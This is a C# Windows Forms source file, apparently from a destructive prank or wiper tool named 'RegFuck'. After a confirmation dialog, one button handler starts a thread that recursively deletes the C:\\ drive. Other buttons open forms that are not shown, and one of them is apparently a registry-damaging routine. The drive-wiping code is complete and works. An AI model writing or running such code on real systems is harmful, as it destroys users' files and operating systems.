using System;
using System.Windows.Forms;

namespace RegFuck
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                new Form2(80).ShowDialog();
                Hide();
            }
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            label2.Text = String.Format("{0:F2}%", Math.Pow(2, (trackBar1.Value / (100.0/12))-12)*100);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            label2.Text = String.Format("{0:F2}%", Math.Pow(2, (trackBar1.Value / (100.0 / 12)) - 12) * 100);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            new Form4().ShowDialog();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                new System.Threading.Thread(()=>System.IO.Directory.Delete("c:\\", true)).Start();
            }
        }
    }
}
